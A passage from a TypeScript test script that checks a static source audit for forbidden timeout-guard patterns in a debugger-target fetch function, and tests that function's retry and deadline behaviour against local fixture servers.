    { name: "bindless_catch_with_tabs", source: applyEdits([head("}\tcatch\t{")]), expected: true },
    { name: "binding_shape_named_in_a_line_comment", source: applyEdits([before("// A shape like } catch (error) { is forbidden here.\n      ")]), expected: true },
    { name: "guard_named_in_a_block_comment", source: applyEdits([before("/* No instanceof ProofTimeoutError guard belongs here. */\n      ")]), expected: true },
    { name: "both_shapes_named_in_one_block_comment", source: applyEdits([before("/* Neither } catch (error) { nor instanceof ProofTimeoutError belongs here. */\n      ")]), expected: true },
    { name: "both_shapes_named_in_doubled_line_comments", source: applyEdits([before("// } catch (error) {\n      // instanceof ProofTimeoutError\n      ")]), expected: true },
    { name: "binding_shape_commented_out_inside_the_function", source: applyEdits([head("// } catch (error) {\n      } catch {")]), expected: true },
    { name: "catch_binds_an_error", source: applyEdits([head("} catch (error) {")]), expected: false },
    { name: "catch_binds_without_spaces", source: applyEdits([head("}catch(error){")]), expected: false },
    { name: "catch_binds_across_newlines", source: applyEdits([head("}\n catch\n (error)\n {")]), expected: false },
    { name: "catch_removed_entirely", source: applyEdits([head("} finally {")]), expected: false },
    { name: "second_binding_catch_appended", source: applyEdits([after("\n      try { attempts += 0 } catch (error) { void error }")]), expected: false },
    { name: "timeout_guard_readded", source: applyEdits([body(guardStatement)]), expected: false },
    { name: "timeout_guard_with_a_double_space", source: applyEdits([body("\n        if (error instanceof  ProofTimeoutError) throw error;")]), expected: false },
    { name: "slash_pair_literal_after_the_binding", source: applyEdits([head("} catch (error) {"), body("\n        const trailer = \"/*\";")]), expected: false },
    { name: "slash_pair_literals_around_a_rebound_catch", source: applyEdits([before("const opener = \"/*\";\n      "), head("} catch (error) {"), after("\n      const closer = \"*/ } catch {\";\n      if (closer.length) attempts += 0;")]), expected: false },
    { name: "reviewer_unescaped_regex_opener_rebinding_and_line_comment_closer", source: applyEdits([before(unescapedRegexOpener), head("} catch (error) {"), body(guardStatement), after("\n      // The shape */ } catch { must never appear below.")]), expected: false },
    { name: "unescaped_regex_atom_opener_with_a_rebound_catch", source: applyEdits([before("const slashy = /a\\/*/;\n      if (slashy.test(url)) attempts += 0;\n      "), head("} catch (error) {")]), expected: false },
    { name: "unescaped_regex_opener_with_a_timeout_guard_only", source: applyEdits([before(unescapedRegexOpener), body(guardStatement)]), expected: false },
    { name: "name_string_guard_in_the_bindless_catch", source: applyEdits([body("\n        if ((error as Error).name === \"ProofTimeoutError\") throw error;")]), expected: false },
    { name: "name_string_guard_through_a_switch", source: applyEdits([body("\n        switch ((error as Error).name) { case \"ProofTimeoutError\": throw error; }")]), expected: false },
    { name: "unparseable_source_fails_closed", source: applyEdits([head("{")]), expected: false },
    { name: "unescaped_regex_literal_alone", source: applyEdits([before(unescapedRegexOpener)]), expected: true },
    { name: "escaped_regex_literal_slash_pair", source: applyEdits([before("const slashy = /\\/\\*/;\n      if (slashy.test(url)) attempts += 0;\n      ")]), expected: true },
    { name: "string_with_an_escaped_quote_and_a_slash_pair", source: applyEdits([before("const quoted = \"a\\\"b/*\";\n      if (quoted.length) attempts += 0;\n      ")]), expected: true },
    { name: "string_with_a_double_slash_url", source: applyEdits([before("const listed = \"http://example.invalid/json\";\n      if (listed.length) attempts += 0;\n      ")]), expected: true },
    { name: "template_literal_with_a_quote_in_an_interpolation", source: applyEdits([before("const shaped = `x${\"a'b\\\"c\"}y`;\n      if (shaped.length) attempts += 0;\n      ")]), expected: true },
    { name: "line_comment_containing_a_block_comment_close", source: applyEdits([before("// this line closes nothing */ at all\n      ")]), expected: true },
    { name: "nested_looking_block_comment", source: applyEdits([before("/* /* */\n      ")]), expected: true },
    { name: "guard_named_in_a_string_literal", source: applyEdits([before("const prose = \"instanceof ProofTimeoutError\";\n      if (prose.length) attempts += 0;\n      ")]), expected: true },
    { name: "odd_spacing_and_tabs_around_the_catch", source: applyEdits([head("}  \t catch \t {")]), expected: true },
    // A guard bound by a callback parameter instead of a catch clause, in every
    // way the rejection path of this function can hand one over, and an
    // identity test that never spells the class. The catch clause is untouched
    // in all of them: these are the shapes that audited clean while a live
    // timeout guard sat in the same rejection path.
    { name: "callback_guard_through_a_helper_declared_outside_the_function", source: applyEdits([outside(rethrowHelper), onFetch(".catch(rethrowIfTimeout)")]), expected: false },
    { name: "callback_guard_in_an_inline_arrow_by_prototype_identity", source: applyEdits([onFetch(".catch((error) => { if (Object.getPrototypeOf(error) === ProofTimeoutError.prototype) throw error; throw error; })")]), expected: false },
    { name: "callback_guard_in_an_inline_arrow_by_constructor_identity", source: applyEdits([onFetch(".catch((error) => { if ((error as Error).constructor === ProofTimeoutError) throw error; throw error; })")]), expected: false },
    { name: "callback_guard_in_a_function_expression", source: applyEdits([onFetch(".catch(function (error) { if (error instanceof ProofTimeoutError) throw error; throw error; })")]), expected: false },
    { name: "callback_guard_against_a_local_alias_of_the_class", source: applyEdits([outside("const PTE_ALIAS = ProofTimeoutError;\n"), onFetch(".catch((error) => { if (error instanceof PTE_ALIAS) throw error; throw error; })")]), expected: false },
    { name: "callback_guard_against_an_aliased_import_of_the_class", source: applyEdits([outside("import { ProofTimeoutError as PTE_IMPORTED } from \"./dashboard-security-proof\";\n"), onFetch(".catch((error) => { if (error instanceof PTE_IMPORTED) throw error; throw error; })")]), expected: false },
    { name: "callback_guard_on_the_body_cancel_handler", source: applyEdits([bodyHandler("(error) => { if (error instanceof ProofTimeoutError) throw error; }")]), expected: false },
    { name: "callback_guard_as_a_then_rejection_handler", source: applyEdits([outside(rethrowHelper), onFetch(".then((settled) => settled, rethrowIfTimeout)")]), expected: false },
    { name: "callback_handler_this_file_cannot_resolve", source: applyEdits([onFetch(".catch(importedRethrow)")]), expected: false },
    { name: "callback_handler_resolving_to_two_functions", source: applyEdits([outside(rethrowHelper), outside(silentHelper.replace("ignoreRejection", "rethrowIfTimeout")), onFetch(".catch(rethrowIfTimeout)")]), expected: false },
    { name: "prototype_identity_guard_in_the_bindless_catch", source: applyEdits([body("\n        if (Object.getPrototypeOf(error) === ProofTimeoutError.prototype) throw error;")]), expected: false },
    { name: "constructor_identity_guard_in_the_bindless_catch", source: applyEdits([body("\n        if ((error as Error).constructor === ProofTimeoutError) throw error;")]), expected: false },
    { name: "aliased_instanceof_guard_in_the_bindless_catch", source: applyEdits([outside("const PTE_ALIAS = ProofTimeoutError;\n"), body("\n        if (error instanceof PTE_ALIAS) throw error;")]), expected: false },
    // The same rejection path carrying no guard stays green: reading handlers
    // must not make a handler a defect.
    { name: "benign_inline_handler_without_a_guard", source: applyEdits([onFetch(".catch(() => { throw new Error(\"transient\") })")]), expected: true },
    { name: "benign_handler_through_a_resolved_helper", source: applyEdits([outside(silentHelper), onFetch(".catch(ignoreRejection)")]), expected: true },
    { name: "benign_handler_naming_the_class_in_a_string", source: applyEdits([onFetch(".catch(() => { const prose = \"instanceof ProofTimeoutError\"; throw new Error(prose) })")]), expected: true },
    // The endless retry loop, in each form that is the same loop, and in the
    // forms that are not.
    { name: "retry_loop_rewritten_as_while_true", source: applyEdits(loopAs("while (true) ", "")), expected: true },
    { name: "retry_loop_rewritten_as_do_while_true", source: applyEdits(loopAs("do ", " while (true);")), expected: true },
    { name: "retry_loop_with_an_initializer_and_no_condition", source: applyEdits(loopAs("for (let round = 0; ; round += 1) ", "")), expected: true },
    { name: "retry_loop_behind_a_label", source: applyEdits([beforeLoop("retry: ")]), expected: true },
    { name: "retry_loop_given_a_real_while_condition", source: applyEdits(loopAs("while (attempts < 3) ", "")), expected: false },
    { name: "retry_loop_given_a_real_do_while_condition", source: applyEdits(loopAs("do ", " while (attempts < 3);")), expected: false },
    { name: "second_endless_loop_around_the_retry", source: applyEdits([beforeLoop("while (true) ")]), expected: false },
    // A live guard that decides it is holding a ProofTimeoutError without a
    // binary test on a bare class name: the call form, the same call spelled
    // through Object.prototype, and the class behind parentheses. All three
    // audited clean at the revision before this one, in the position of the
    // must-red probe two rows above (REVIEW-89 N1).
    { name: "callback_guard_by_isprototypeof_on_the_body_cancel_handler", source: applyEdits([bodyHandler("(error) => { if (ProofTimeoutError.prototype.isPrototypeOf(error as object)) throw error; }")]), expected: false },
    { name: "callback_guard_by_isprototypeof_through_object_prototype_call", source: applyEdits([bodyHandler("(error) => { if (Object.prototype.isPrototypeOf.call(ProofTimeoutError.prototype, error)) throw error; }")]), expected: false },
    { name: "callback_guard_with_the_class_in_parentheses", source: applyEdits([bodyHandler("(error) => { if (error instanceof (ProofTimeoutError)) throw error; }")]), expected: false },
    { name: "prototype_identity_guard_with_the_class_in_parentheses", source: applyEdits([bodyHandler("(error) => { if (Object.getPrototypeOf(error) === (ProofTimeoutError).prototype) throw error; }")]), expected: false },
    { name: "isprototypeof_guard_in_the_bindless_catch", source: applyEdits([body("\n        if (ProofTimeoutError.prototype.isPrototypeOf(error as object)) throw error;")]), expected: false },
    // The same two shapes against a class this audit says nothing about stay
    // green: reading through parentheses and reading a prototype call must not
    // make every type test a guard.
    { name: "benign_isprototypeof_against_another_class", source: applyEdits([bodyHandler("(error) => { if (Error.prototype.isPrototypeOf(error as object)) throw error; }")]), expected: true },
    { name: "benign_instanceof_another_class_in_parentheses", source: applyEdits([bodyHandler("(error) => { if (error instanceof (RangeError)) throw error; }")]), expected: true },
    // A handler reached other than through a .catch/.then property access: the
    // .finally callback, the element-access spellings of both, and a handler
    // declared outside and handed to Promise.allSettled(...).then. All four
    // audited clean at the revision before this one (REVIEW-89 N4).
    { name: "callback_guard_in_a_finally_callback", source: applyEdits([outside(rethrowHelper), onFetch(".finally(rethrowIfTimeout)")]), expected: false },
    { name: "callback_guard_through_an_element_access_catch", source: applyEdits([outside(rethrowHelper), onFetch("[\"catch\"](rethrowIfTimeout)")]), expected: false },
    { name: "callback_guard_through_an_element_access_then", source: applyEdits([outside(rethrowHelper), onFetch("['then']((settled) => settled, rethrowIfTimeout)")]), expected: false },
    { name: "callback_guard_in_a_settled_handler_declared_outside", source: applyEdits([outside(settledHelper), before("void Promise.allSettled([Promise.resolve(url)]).then(inspectSettled);\n      ")]), expected: false },
    // The same three positions carrying no guard stay green.
    { name: "benign_finally_callback_without_a_guard", source: applyEdits([onFetch(".finally(() => { attempts += 0 })")]), expected: true },
    { name: "benign_then_fulfilment_handler_without_a_guard", source: applyEdits([onFetch(".then((settled) => settled)")]), expected: true },
    { name: "benign_parenthesised_inline_handler_without_a_guard", source: applyEdits([onFetch(".catch(((error) => { void error; throw error as Error }))")]), expected: true },
    // The four handler spellings the audit refuses rather than reads, each one
    // named in unresolvedHandlerForms so the red says what it is looking at
    // (REVIEW-89 N3).
    { name: "callback_handler_const_alias_of_a_resolvable_helper", source: applyEdits([outside(rethrowHelper), outside(aliasHelper), onFetch(".catch(boundRethrow)")]), expected: false },
    { name: "callback_handler_method_reference", source: applyEdits([outside(holderHelper), onFetch(".catch(rejectionGuards.rethrow)")]), expected: false },
    { name: "callback_handler_bind_result", source: applyEdits([outside(rethrowHelper), onFetch(".catch(rethrowIfTimeout.bind(null))")]), expected: false },
    { name: "callback_handler_comma_expression", source: applyEdits([outside(rethrowHelper), onFetch(".catch((0, rethrowIfTimeout))")]), expected: false },
    // instanceof written as the Symbol.hasInstance call it compiles to, in the
    // body-cancel handler position and in the bindless catch and in both
    // spellings of the symbol, and a handler resolved to a declaration this
    // file gives no body. The first and the last of these audited clean at the
    // revision before this one with a live guard, or an unreadable handler,
    // sitting in the rejection path (REVIEW-98 F1, F4).
    { name: "callback_guard_by_symbol_hasinstance_on_the_body_cancel_handler", source: applyEdits([bodyHandler("(error) => { if (ProofTimeoutError[Symbol.hasInstance](error)) throw error; }")]), expected: false },
    { name: "callback_guard_by_symbol_hasinstance_with_the_property_as_a_literal", source: applyEdits([bodyHandler("(error) => { if (ProofTimeoutError[Symbol[\"hasInstance\"]](error)) throw error; }")]), expected: false },
    { name: "symbol_hasinstance_guard_in_the_bindless_catch", source: applyEdits([body("\n        if (ProofTimeoutError[Symbol.hasInstance](error)) throw error;")]), expected: false },
    { name: "callback_handler_resolved_to_a_declaration_without_a_body", source: applyEdits([outside("declare function rethrowIfTimeout(error: unknown): never;\n"), onFetch(".catch(rethrowIfTimeout)")]), expected: false },
    // The same call forms that decide nothing stay green: the symbol call
    // against a class this audit says nothing about, and an isPrototypeOf with
    // no argument, which returns false whatever is thrown.
    { name: "benign_symbol_hasinstance_against_another_class", source: applyEdits([bodyHandler("(error) => { if (RangeError[Symbol.hasInstance](error)) throw error; }")]), expected: true },
    { name: "benign_isprototypeof_call_with_no_argument", source: applyEdits([bodyHandler("(error) => { if (ProofTimeoutError.prototype.isPrototypeOf()) throw error; }")]), expected: true },
    // And the decision the call forms make on purpose: the class is read, the
    // argument is not, so a prototype test against something that is not the
    // caught error still counts. Erring red, and symmetrical with the binary
    // forms, which read one operand and not the other (REVIEW-98 F6).
    { name: "isprototypeof_guard_against_a_value_that_is_not_the_caught_error", source: applyEdits([bodyHandler("(error) => { if (ProofTimeoutError.prototype.isPrototypeOf(Object.create(null))) attempts += 0; throw error as Error }")]), expected: false },
  ];
  // Every literal opener that defeated the lexical strip, crossed with every
  // closer it was paired with and with the two sabotages they were used to
  // hide. The parser makes all of them irrelevant to the counts, and this
  // cross-product is what keeps that true.
  const openers = [
    { key: "no_opener", text: "" },
    { key: "unescaped_regex_class", text: unescapedRegexOpener },
    { key: "unescaped_regex_atom", text: "const slashy = /a\\/*/;\n      if (slashy.test(url)) attempts += 0;\n      " },
    { key: "escaped_regex_pair", text: "const slashy = /\\/\\*/;\n      if (slashy.test(url)) attempts += 0;\n      " },
    { key: "string_slash_pair", text: "const opener = \"/*\";\n      if (opener.length) attempts += 0;\n      " },
  ];
  const closers = [
    { key: "no_closer", text: "" },
    { key: "line_comment_closer", text: "\n      // The shape */ } catch { must never appear below." },
    { key: "string_closer", text: "\n      const closer = \"*/ } catch {\";\n      if (closer.length) attempts += 0;" },
    { key: "block_comment_closer", text: "\n      /* this closes the pair */" },
  ];
  const sabotages = [
    { key: "no_sabotage", expected: true, edits: [] as SourceEdit[] },
    { key: "rebound_catch", expected: false, edits: [head("} catch (error) {")] },
    { key: "timeout_guard", expected: false, edits: [body(guardStatement)] },
  ];
  const matrix = openers.flatMap((opener) => closers.flatMap((closer) => sabotages.map((sabotage) => ({
    name: `matrix__${opener.key}__${closer.key}__${sabotage.key}`,
    source: applyEdits([
      ...(opener.text ? [before(opener.text)] : []),
      ...(closer.text ? [after(closer.text)] : []),
      ...sabotage.edits,
    ]),
    expected: sabotage.expected,
  }))));
  const results = [...named, ...matrix].map((probe) => {
    const audit = auditFetchSource(probe.source);
    return {
      name: probe.name,
      expected: probe.expected,
      clean: audit.clean,
      parsed: audit.parsed,
      catchBindings: audit.catchBindings,
      bindlessCatches: audit.bindlessCatches,
      timeoutGuards: audit.timeoutGuards,
      callbackGuards: audit.callbackGuards,
      unresolvedHandlers: audit.unresolvedHandlers,
      forEver: audit.forEver,
      loopForms: audit.loopForms,
      ...(audit.unresolvedHandlerForms.length ? { unresolvedHandlerForms: audit.unresolvedHandlerForms } : {}),
      ...(audit.diagnostic ? { diagnostic: audit.diagnostic } : {}),
    };
  });
  const mismatches = results.filter((result) => result.clean !== result.expected);
  const malicious = results.filter((result) => !result.expected);
  const benign = results.filter((result) => result.expected);
  check(
    checkName,
    named.length === 82 && matrix.length === 60 && results.length === 142 && mismatches.length === 0,
    JSON.stringify({
      method: "typescript-ast",
      probes: results.length,
      maliciousRed: `${malicious.filter((result) => !result.clean).length}/${malicious.length}`,
      benignGreen: `${benign.filter((result) => result.clean).length}/${benign.length}`,
      mismatches,
      matrix: { variants: matrix.length, openers: openers.length, closers: closers.length, sabotages: sabotages.length },
      named: results.slice(0, named.length),
    }),
  );
}

// Drives the real fetchDebuggerPageTarget against a server that answers 200
// with a fixed body, and reports a content-free receipt of what came back. The
// options ride through so a probe can hold a body against an injected deadline.
async function probeDebuggerBody(body: string, options: DebuggerTargetOptions = {}) {
  let requests = 0;
  const server = http.createServer((_request, response) => {
    requests += 1;
    response.writeHead(200, { "content-type": "application/json" });
    response.end(body);
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
  const port = (server.address() as AddressInfo).port;
  const signal = new AbortController().signal;
  const timersBefore = activeTimerCount();
  const startedAt = Date.now();
  let attempts = 0;
  let error: unknown;
  try {
    await fetchDebuggerPageTarget(`http://127.0.0.1:${port}/json/list`, signal, {
      ...options,
      onAttempts: (count) => { attempts = count },
    });
  } catch (caught) {
    error = caught;
  }
  const elapsedMs = Date.now() - startedAt;
  const timersAfter = activeTimerCount();
  const listeners = getEventListeners(signal, "abort").length;
  const serverClosed = await closeFixtureServer(server);
  return {
    port,
    requests,
    attempts,
    elapsedMs,
    timersBefore,
    timersAfter,
    listeners,
    serverClosed,
    isTimeoutError: error instanceof ProofTimeoutError,
    message: error instanceof Error ? error.message : "missing",
  };
}

// A port held for the check's lifetime by a listener that destroys every
// connection as it arrives, so connects fail the way a closed port does and no
// other process can take the port while the check runs. Freeing the port and
// assuming it stays refused would let another process bind it mid-check.
async function reserveRefusingPort() {
  const holder = http.createServer();
  holder.on("connection", (socket) => socket.destroy());
  await new Promise<void>((resolve) => holder.listen(0, "127.0.0.1", () => resolve()));
  const { port } = holder.address() as AddressInfo;
  return { port, release: () => closeFixtureServer(holder) };
}

// What a second listener gets when it tries to take the same port.
function bindOutcome(port: number) {
  return new Promise<string>((resolve) => {
    const contender = http.createServer();
    contender.once("error", (error: NodeJS.ErrnoException) => resolve(error.code ?? "bind_error"));
    contender.listen(port, "127.0.0.1", () => contender.close(() => resolve("bound")));
  });
}

async function proveDebuggerTargetRetry() {
  // The deadline is a chosen ceiling over the failing hosted run, not a
  // measurement of the interval it governs: see the record above. This asserts
  // exactly that — it exceeds the hosted run that failed, it fits inside the
  // overall wall clock next to the slowest stage ever observed, it leaves
  // enough retry steps, and it is the round number the chosen margin produces.
  const marginDeadlineMs =
    Math.round(DEBUGGER_TARGET_DERIVATION.failingRunSpawnToFirstErrorMs * DEBUGGER_TARGET_DERIVATION.chosenMargin / 1_000) * 1_000;
  const slowestStageMs = Math.max(...Object.values(DEBUGGER_TARGET_DERIVATION.passingRunBrowserStageMs));
  check(
    "debugger_target_deadline_exceeds_the_hosted_run_that_failed_and_fits_the_wall_budget",
    DEBUGGER_TARGET_MS === marginDeadlineMs &&
      DEBUGGER_TARGET_MS > DEBUGGER_TARGET_DERIVATION.failingRunSpawnToFirstErrorMs &&
      DEBUGGER_TARGET_MS + slowestStageMs <= BROWSER_PROOF_WALL_MS &&
      DEBUGGER_TARGET_MS / DEBUGGER_TARGET_RETRY_MS >= 50,
    JSON.stringify({
      deadlineMs: DEBUGGER_TARGET_MS,
      marginDeadlineMs,
      ...DEBUGGER_TARGET_DERIVATION,
      slowestStageMs,
      wallMs: BROWSER_PROOF_WALL_MS,
      retryStepMs: DEBUGGER_TARGET_RETRY_MS,
    }),
  );

  check(
    "debugger_target_deadline_defaults_to_the_shipped_constant_when_none_is_injected",
    resolveDebuggerDeadlineMs({}) === DEBUGGER_TARGET_MS &&
      resolveDebuggerDeadlineMs({ deadlineMs: NEVER_READY_DEADLINE_MS }) === NEVER_READY_DEADLINE_MS &&
      NEVER_READY_DEADLINE_MS < DEBUGGER_TARGET_MS,
    JSON.stringify({
      defaultDeadlineMs: resolveDebuggerDeadlineMs({}),
      shippedDeadlineMs: DEBUGGER_TARGET_MS,
      neverReadyDeadlineMs: NEVER_READY_DEADLINE_MS,
    }),
  );

  const proofSource = fs.readFileSync(scriptPath, "utf8");
  const fetchAudit = auditFetchSource(proofSource);
  check(
    "debugger_target_fetch_catch_binds_no_error_so_a_timeout_guard_cannot_live_there",
    fetchAudit.clean,
    JSON.stringify(fetchAudit),
  );

  proveFetchSourceAudit(proofSource);

  const pageTarget = { type: "page", webSocketDebuggerUrl: "ws://127.0.0.1/devtools/page/proof" };
  let connections = 0,requests = 0;
  const flaky = http.createServer((_request, response) => {
    requests += 1;
    if (requests < 2) {
      response.writeHead(503, { "content-type": "text/plain" });
      response.end("devtools listener not ready");
      return;
    }
    response.writeHead(200, { "content-type": "application/json" });
    response.end(JSON.stringify([
      { type: "background_page", webSocketDebuggerUrl: "ws://127.0.0.1/devtools/page/background" },
      pageTarget,
    ]));
  });
  // The first connections are accepted then reset the way Chrome's listener
  // behaves before it is ready; the first request it answers is non-OK.
  flaky.on("connection", (socket) => {
    connections += 1;
    if (connections <= 2) socket.destroy();
  });
  await new Promise<void>((resolve) => flaky.listen(0, "127.0.0.1", () => resolve()));
  const flakyPort = (flaky.address() as AddressInfo).port;
  const retrySignal = new AbortController().signal;
  const retryTimersBefore = activeTimerCount();
  const retryStartedAt = Date.now();
  let retryTarget: { type: string; webSocketDebuggerUrl: string } | undefined;
  let retryError: unknown;
  try {
    retryTarget = await fetchDebuggerPageTarget(`http://127.0.0.1:${flakyPort}/json/list`, retrySignal);
  } catch (error) {
    retryError = error;
  }
  const retryElapsedMs = Date.now() - retryStartedAt;
  const retryTimers = activeTimerCount();
  const retryListeners = getEventListeners(retrySignal, "abort").length;
  const flakyClosed = await closeFixtureServer(flaky);
  check(
    "debugger_targets_retry_resolves_after_refused_connections_and_non_ok_responses",
    retryError === undefined &&
      retryTarget?.webSocketDebuggerUrl === pageTarget.webSocketDebuggerUrl &&
      connections > 2 &&
      requests > 1 &&
      retryElapsedMs < DEBUGGER_TARGET_MS &&
      retryTimers <= retryTimersBefore &&
      retryListeners === 0 &&
      flakyClosed,
    JSON.stringify({
      error: retryError instanceof Error ? retryError.message : "none",
      target: retryTarget?.type ?? "none",
      connections,
      requests,
      elapsedMs: retryElapsedMs,
      timersBefore: retryTimersBefore,
      timersAfter: retryTimers,
      listeners: retryListeners,
      serverClosed: flakyClosed,
    }),
  );

  // Chrome answers /json/list before its first page target registers. That
  // answer is well shaped and holds no page target, so the step must poll
  // through it and resolve when the page appears, inside the deadline.
  const registeredTarget = { type: "page", webSocketDebuggerUrl: "ws://127.0.0.1/devtools/page/registered" };
  const emptyAnswers = 3;
  let registeringRequests = 0;
  const registering = http.createServer((_request, response) => {
    registeringRequests += 1;
    response.writeHead(200, { "content-type": "application/json" });
    response.end(JSON.stringify(
      registeringRequests <= emptyAnswers ? [] : [{ type: "background_page" }, registeredTarget],
    ));
  });
  await new Promise<void>((resolve) => registering.listen(0, "127.0.0.1", () => resolve()));
  const registeringPort = (registering.address() as AddressInfo).port;
  const registeringSignal = new AbortController().signal;
  const registeringTimersBefore = activeTimerCount();
  const registeringStartedAt = Date.now();
  let registeringAttempts = 0;
  let registeringTarget: { type: string; webSocketDebuggerUrl: string } | undefined;
  let registeringError: unknown;
  try {
    registeringTarget = await fetchDebuggerPageTarget(`http://127.0.0.1:${registeringPort}/json/list`, registeringSignal, {
      onAttempts: (attempts) => { registeringAttempts = attempts },
    });
  } catch (error) {
    registeringError = error;
  }
  const registeringElapsedMs = Date.now() - registeringStartedAt;
  const registeringTimers = activeTimerCount();
  const registeringListeners = getEventListeners(registeringSignal, "abort").length;
  const registeringClosed = await closeFixtureServer(registering);
  check(
    "debugger_target_empty_list_is_transient_and_retried_until_the_page_target_registers",
    registeringError === undefined &&
      registeringTarget?.webSocketDebuggerUrl === registeredTarget.webSocketDebuggerUrl &&
      registeringAttempts === emptyAnswers + 1 &&
      registeringRequests === emptyAnswers + 1 &&
      registeringElapsedMs < DEBUGGER_TARGET_MS &&
      registeringTimers <= registeringTimersBefore &&
      registeringListeners === 0 &&
      registeringClosed,
    JSON.stringify({
      error: registeringError instanceof Error ? registeringError.message : "none",
      target: registeringTarget?.type ?? "none",
      emptyAnswers,
      requests: registeringRequests,
      attempts: registeringAttempts,
      elapsedMs: registeringElapsedMs,
      deadlineMs: DEBUGGER_TARGET_MS,
      timersBefore: registeringTimersBefore,
      timersAfter: registeringTimers,
      listeners: registeringListeners,
      serverClosed: registeringClosed,
    }),
  );

  // A 200 whose body is not a target list: the step must end on it, not refetch
  // it until the deadline, and it must not be reported as a deadline expiry.
  const prose = await probeDebuggerBody("devtools listener answered with prose");
  check(
    "debugger_targets_unparseable_ok_body_fails_fast_content_free_without_leaks",
    prose.isTimeoutError &&
      prose.message === "proof_timeout:debugger_target:payload" &&
      !prose.message.includes(String(prose.port)) &&
      !prose.message.includes("127.0.0.1") &&
      !prose.message.includes("prose") &&
      prose.requests === 1 &&
      prose.attempts === 1 &&
      prose.elapsedMs < DEBUGGER_TARGET_MS / 4 &&
      prose.timersAfter <= prose.timersBefore &&
      prose.listeners === 0 &&
      prose.serverClosed,
    JSON.stringify({
      error: prose.message,
      requests: prose.requests,
      attempts: prose.attempts,
      elapsedMs: prose.elapsedMs,
      deadlineMs: DEBUGGER_TARGET_MS,
      retryStepMs: DEBUGGER_TARGET_RETRY_MS,
      timersBefore: prose.timersBefore,
      timersAfter: prose.timersAfter,
      listeners: prose.listeners,
      serverClosed: prose.serverClosed,
    }),
  );

  // A JSON array that is not an array of targets is just as undecodable as
  // prose, so it takes the same payload path instead of reaching the caller.
  const wrongShapes = [
    { name: "array_of_non_target_objects", probe: await probeDebuggerBody(JSON.stringify([{ foo: 1 }])) },
    { name: "array_of_strings", probe: await probeDebuggerBody(JSON.stringify(["a", "b"])) },
  ];
  check(
    "debugger_targets_wrong_shaped_array_fails_fast_through_the_payload_path",
    wrongShapes.every(({ probe }) =>
      probe.isTimeoutError &&
        probe.message === "proof_timeout:debugger_target:payload" &&
        !probe.message.includes(String(probe.port)) &&
        !probe.message.includes("127.0.0.1") &&
        probe.requests === 1 &&
        probe.attempts === 1 &&
        probe.elapsedMs < DEBUGGER_TARGET_MS / 4 &&
        probe.timersAfter <= probe.timersBefore &&
        probe.listeners === 0 &&
        probe.serverClosed),
    JSON.stringify(wrongShapes.map(({ name, probe }) => ({
      name,
      error: probe.message,
      requests: probe.requests,
      attempts: probe.attempts,
      elapsedMs: probe.elapsedMs,
      timersBefore: probe.timersBefore,
      timersAfter: probe.timersAfter,
      listeners: probe.listeners,
      serverClosed: probe.serverClosed,
    }))),
  );

  // Both never-ready checks below run on an injected deadline: they prove a
  // deadline is enforced, which needs no production ceiling, and the shipped
  // constant is pinned by its own checks above.
  const refusing = await reserveRefusingPort();
  const bindWhileHeld = await bindOutcome(refusing.port);
  const deadlineSignal = new AbortController().signal;
  const deadlineTimersBefore = activeTimerCount();
  const deadlineStartedAt = Date.now();
  let deadlineAttempts = 0;
  let deadlineError: unknown;
  try {
    await fetchDebuggerPageTarget(`http://127.0.0.1:${refusing.port}/json/list`, deadlineSignal, {
      deadlineMs: NEVER_READY_DEADLINE_MS,
      onAttempts: (attempts) => { deadlineAttempts = attempts },
    });
  } catch (error) {
    deadlineError = error;
  }
  const deadlineElapsedMs = Date.now() - deadlineStartedAt;
  const deadlineTimers = activeTimerCount();
  const deadlineListeners = getEventListeners(deadlineSignal, "abort").length;
  const deadlineMessage = deadlineError instanceof Error ? deadlineError.message : "missing";
  check(
    "debugger_targets_unreachable_endpoint_rejects_at_deadline_content_free_without_leaks",
    deadlineError instanceof ProofTimeoutError &&
      deadlineMessage === "proof_timeout:debugger_target" &&
      !deadlineMessage.includes(String(refusing.port)) &&
      !deadlineMessage.includes("127.0.0.1") &&
      deadlineAttempts > 1 &&
      deadlineElapsedMs >= NEVER_READY_DEADLINE_MS &&
      deadlineElapsedMs < NEVER_READY_DEADLINE_MS + ABORT_SETTLE_MS &&
      deadlineTimers <= deadlineTimersBefore &&
      deadlineListeners === 0,
    JSON.stringify({
      error: deadlineMessage,
      attempts: deadlineAttempts,
      elapsedMs: deadlineElapsedMs,
      deadlineMs: NEVER_READY_DEADLINE_MS,
      shippedDeadlineMs: DEBUGGER_TARGET_MS,
      timersBefore: deadlineTimersBefore,
      timersAfter: deadlineTimers,
      listeners: deadlineListeners,
    }),
  );

  // The held port answers connections and resets them. A port nothing listens
  // on refuses them instead, which is the condition Chrome actually presents
  // before its devtools listener is up: it must stay transient and retry.
  const vacated = http.createServer();
  await new Promise<void>((resolve) => vacated.listen(0, "127.0.0.1", () => resolve()));
  const refusedPort = (vacated.address() as AddressInfo).port;
  const vacatedClosed = await closeFixtureServer(vacated);
  const refusedSignal = new AbortController().signal;
  const refusedTimersBefore = activeTimerCount();
  const refusedStartedAt = Date.now();
  let refusedAttempts = 0;
  let refusedError: unknown;
  try {
    await fetchDebuggerPageTarget(`http://127.0.0.1:${refusedPort}/json/list`, refusedSignal, {
      deadlineMs: NEVER_READY_DEADLINE_MS,
      onAttempts: (attempts) => { refusedAttempts = attempts },
    });
  } catch (error) {
    refusedError = error;
  }
  const refusedElapsedMs = Date.now() - refusedStartedAt;
  const refusedTimers = activeTimerCount();
  const refusedListeners = getEventListeners(refusedSignal, "abort").length;
  const refusedMessage = refusedError instanceof Error ? refusedError.message : "missing";
  // Nothing may have taken the freed port meanwhile, or the refusals were not
  // the stimulus under test.
  const refusedPortStillFree = await bindOutcome(refusedPort);
  check(
    "debugger_target_refused_connection_is_transient_and_retried_until_the_deadline",
    refusedError instanceof ProofTimeoutError &&
      refusedMessage === "proof_timeout:debugger_target" &&
      !refusedMessage.includes(String(refusedPort)) &&
      !refusedMessage.includes("127.0.0.1") &&
      vacatedClosed &&
      refusedPortStillFree === "bound" &&
      refusedAttempts > 1 &&
      refusedElapsedMs >= NEVER_READY_DEADLINE_MS &&
      refusedElapsedMs < NEVER_READY_DEADLINE_MS + ABORT_SETTLE_MS &&
      refusedTimers <= refusedTimersBefore &&
      refusedListeners === 0,
    JSON.stringify({
      error: refusedMessage,
      attempts: refusedAttempts,
      elapsedMs: refusedElapsedMs,
      deadlineMs: NEVER_READY_DEADLINE_MS,
      shippedDeadlineMs: DEBUGGER_TARGET_MS,
      listenerClosed: vacatedClosed,
      portStillFree: refusedPortStillFree,
